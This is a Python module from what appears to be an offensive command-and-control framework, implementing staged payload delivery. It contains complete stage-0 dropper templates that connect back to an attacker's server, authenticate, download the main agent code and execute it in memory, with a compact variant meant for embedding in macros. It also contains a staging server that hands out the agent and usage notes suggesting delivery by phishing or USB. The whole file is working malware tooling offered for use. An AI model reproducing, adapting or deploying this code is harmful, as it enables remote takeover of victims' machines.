"""
megaploit.core.staging
~~~~~~~~~~~~~~~~~~~~~~
Staged payload delivery system.

Stage 0 (dropper)
-----------------
A tiny connect-back stager that:
  1. Connects to the C2 server
  2. Authenticates
  3. Sends the magic byte "S" to signal stage-loading mode
  4. Receives stage-1 Python source from the server
  5. exec()s it in the current process

Stage 1 (main agent)
--------------------
The full agent Python source, optionally encoded.  Transmitted
over the C2 channel after the stage-0 handshake.

Usage (operator side)
---------------------
    from megaploit.core.staging import StagingServer, generate_stage0

    # Generate a tiny stage-0 dropper
    py_src = generate_stage0("192.168.1.100", 4444, use_tls=False)
    # Deliver stage-0 somehow (phishing, USB, etc.)

    # The StagingServer listens for stage-0 connections and serves stage-1
    srv = StagingServer("192.168.1.100", 4445, agent_source_path="agent.py")
    srv.start()  # background thread
"""

from __future__ import annotations

import base64
import gzip
import hashlib
import hmac
import os
import socket
import ssl
import textwrap
import threading
from typing import Optional


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# H7: maximum compressed agent payload the staging server will transmit.
# Prevents memory exhaustion if agent.py is accidentally bundled with large deps.
_MAX_STAGE_BYTES = 10 * 1024 * 1024   # 10 MB compressed

# H8: per-connection timeout for the staging handshake + payload receive.
_STAGE_CONN_TIMEOUT = 30   # seconds

# ---------------------------------------------------------------------------
# Stage-0 dropper generator
# ---------------------------------------------------------------------------

_STAGE0_TEMPLATE = '''\
import socket,ssl,hmac,hashlib,struct,json,os,time,threading
LHOST="{lhost}"
PORT={port}
KEY=bytes.fromhex("{key_hex}")
USE_TLS={use_tls}
STAGE_MAGIC=b"S"

def _recv_exactly(c,n):
    b=b""
    while len(b)<n:
        ch=c.recv(n-len(b))
        if not ch:return None
        b+=ch
    return b

def _auth(conn):
    ch=_recv_exactly(conn,16)
    if not ch:return False
    resp=hmac.new(KEY,ch,hashlib.sha256).digest()
    conn.sendall(resp)
    return True

def _run():
    while True:
        try:
            raw=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            raw.settimeout(10)
            if USE_TLS:
                ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname=False
                ctx.verify_mode=ssl.CERT_NONE
                conn=ctx.wrap_socket(raw,server_hostname=LHOST)
            else:
                conn=raw
            conn.connect((LHOST,PORT))
            if not _auth(conn):conn.close();time.sleep(10);continue
            # Signal stage mode
            conn.sendall(STAGE_MAGIC)
            # Receive stage-1 length
            hdr=_recv_exactly(conn,4)
            if not hdr:conn.close();time.sleep(10);continue
            length=struct.unpack("!I",hdr)[0]
            code=_recv_exactly(conn,length)
            if not code:conn.close();time.sleep(10);continue
            # Decompress + decode
            try:
                code=__import__("gzip").decompress(code)
            except Exception:
                pass
            exec(compile(code.decode("utf-8","replace"),"<stage1>","exec"),{{"conn":conn,"__name__":"__stage1__"}})
            break
        except Exception:
            pass
        time.sleep(10+{jitter})

threading.Thread(target=_run,daemon=True).start()
import time;time.sleep(9999)
'''

_STAGE0_MINIMAL = '''\
import socket,hmac,hashlib,struct,ssl,time
LHOST="{lhost}";PORT={port};KEY=bytes.fromhex("{key_hex}")
def _r(c,n):
 b=b""
 while len(b)<n:
  ch=c.recv(n-len(b))
  if not ch:return None
  b+=ch
 return b
while True:
 try:
  s=socket.socket();s.settimeout(10);s.connect((LHOST,PORT))
  ch=_r(s,16);s.sendall(hmac.new(KEY,ch,hashlib.sha256).digest())
  s.sendall(b"S")
  n=struct.unpack("!I",_r(s,4))[0];code=_r(s,n)
  try:code=__import__("gzip").decompress(code)
  except:pass
  exec(compile(code.decode("utf-8","replace"),"<s1>","exec"),{{"conn":s}})
  break
 except:pass
 time.sleep(10)
'''


def generate_stage0(
    lhost: str,
    port: int,
    key_hex: str,
    use_tls: bool = False,
    minimal: bool = False,
) -> str:
    """
    Return the stage-0 dropper as a Python source string.

    *minimal=True* produces a compact single-file dropper (no threading,
    shorter variable names) suitable for embedding in a macro or obfuscated payload.
    """
    import random
    template = _STAGE0_MINIMAL if minimal else _STAGE0_TEMPLATE
    return template.format(
        lhost=lhost,
        port=port,
        key_hex=key_hex,
        use_tls=str(use_tls),
        jitter=round(random.uniform(1, 5), 2),
    )


# ---------------------------------------------------------------------------
# Stage-1 payload (the full agent)
# ---------------------------------------------------------------------------

def _load_agent_source(path: str = "agent.py") -> bytes:
    """Read agent.py and return compressed bytes."""
    if not os.path.isfile(path):
        raise FileNotFoundError(f"Agent source not found: {path}")
    with open(path, "rb") as f:
        src = f.read()
    return gzip.compress(src, compresslevel=9)


# ---------------------------------------------------------------------------
# Staging server
# ---------------------------------------------------------------------------

class StagingServer:
    """
    Listens for stage-0 connections (magic byte "S") and serves the full
    agent source as stage-1.  Runs in a background daemon thread.

    Bind on a different port from the main C2 listener, or share the same
    port by multiplexing on the stage-magic byte in the listener.
    """

    STAGE_MAGIC = b"S"

    def __init__(
        self,
        bind_host: str,
        port: int,
        secret_key: bytes,
        agent_source_path: str = "agent.py",
        ssl_context: Optional[ssl.SSLContext] = None,
    ) -> None:
        self.bind_host         = bind_host
        self.port              = port
        self.secret_key        = secret_key
        self.agent_source_path = agent_source_path
        self.ssl_context       = ssl_context
        self._running          = False
        self._thread: Optional[threading.Thread] = None
        self._server_sock: Optional[socket.socket] = None

    def start(self) -> None:
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind((self.bind_host, self.port))
        self._server_sock.listen(5)
        self._running = True
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._running = False
        if self._server_sock:
            try:
                self._server_sock.close()
            except OSError:
                pass

    def _accept_loop(self) -> None:
        while self._running:
            try:
                conn, addr = self._server_sock.accept()
            except OSError:
                break
            threading.Thread(
                target=self._serve_stage,
                args=(conn, addr[0]),
                daemon=True,
            ).start()

    def _serve_stage(self, raw_conn: socket.socket, ip: str) -> None:
        conn = raw_conn
        if self.ssl_context:
            try:
                conn = self.ssl_context.wrap_socket(raw_conn, server_side=True)
            except ssl.SSLError:
                raw_conn.close()
                return

        try:
            # HMAC challenge/response
            challenge = os.urandom(16)
            conn.sendall(challenge)
            resp = self._recv_exactly(conn, 32)
            if resp is None:
                return
            expected = hmac.new(self.secret_key, challenge, hashlib.sha256).digest()
            if not hmac.compare_digest(resp, expected):
                return

            # Wait for STAGE_MAGIC
            magic = conn.recv(1)
            if magic != self.STAGE_MAGIC:
                return

            conn.settimeout(_STAGE_CONN_TIMEOUT)   # H8: guard against slowloris

            # Load + compress agent source
            payload = _load_agent_source(self.agent_source_path)

            # H7: reject oversized payloads before transmitting
            if len(payload) > _MAX_STAGE_BYTES:
                return  # drop the connection silently

            # Send 4-byte length + payload
            import struct
            conn.sendall(struct.pack("!I", len(payload)) + payload)

        except Exception:
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass

    @staticmethod
    def _recv_exactly(conn: socket.socket, n: int) -> Optional[bytes]:
        buf = b""
        while len(buf) < n:
            chunk = conn.recv(n - len(buf))
            if not chunk:
                return None
            buf += chunk
        return buf


# ---------------------------------------------------------------------------
# Operator-side: send stage-1 to an authenticated session
# ---------------------------------------------------------------------------

def deliver_stage1(session_conn: socket.socket, agent_source_path: str = "agent.py") -> bool:
    """
    Send stage-1 payload to a session that has already authenticated and
    sent the STAGE_MAGIC byte.

    Called from the C2 server when it detects a staging session.
    Returns True on success.
    """
    import struct
    try:
        payload = _load_agent_source(agent_source_path)
        if len(payload) > _MAX_STAGE_BYTES:   # H7: size guard
            raise ValueError(
                f"Stage-1 payload too large: {len(payload)} bytes "
                f"(limit {_MAX_STAGE_BYTES}). Check agent.py for bundled dependencies."
            )
        session_conn.sendall(struct.pack("!I", len(payload)) + payload)
        return True
    except Exception:
        return False
